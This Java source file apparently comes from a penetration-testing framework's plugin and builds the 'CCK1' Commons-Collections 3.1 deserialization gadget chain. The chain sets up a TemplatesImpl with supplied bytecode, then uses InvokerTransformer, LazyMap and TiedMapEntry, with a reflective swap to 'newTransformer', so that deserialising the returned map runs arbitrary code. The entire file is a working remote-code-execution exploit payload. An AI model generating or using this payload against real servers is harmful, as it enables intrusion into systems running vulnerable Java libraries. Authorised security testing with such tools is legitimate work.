package me.gv7.woodpecker.plugin.gadgets.bytecode;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import me.gv7.woodpecker.plugin.annotation.DependenciesVersion;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import static me.gv7.woodpecker.plugin.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-3.1")
@RequireParameter("ResourcePath")
public class CCK1 implements ObjectPayload {
    @Override
    public <T> Object getObject(Input input) throws Exception {
        TemplatesImpl obj=new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{input.getBytecode()});
        setFieldValue(obj,"_name","HelloT");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        Transformer transformer = new InvokerTransformer("getClass", null, null);
//        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap=new HashMap();
        Map outerMap = LazyMap.decorate(innerMap,transformer);
        TiedMapEntry tme=new TiedMapEntry(outerMap,obj);
        Map expMap= new HashMap();
        expMap.put(tme,"valuevalue");
        outerMap.clear();

        Field f =
                transformer.getClass().getDeclaredField("iMethodName");
        f.setAccessible(true);
        f.set(transformer, "newTransformer");
        return expMap;
    }

//    public static byte[] getBytecode(final Class classname){
//        JavaClass cls = Repository.lookupClass(classname);
//        byte[] bytes = cls.getBytes();
//        return bytes;
//    }


}
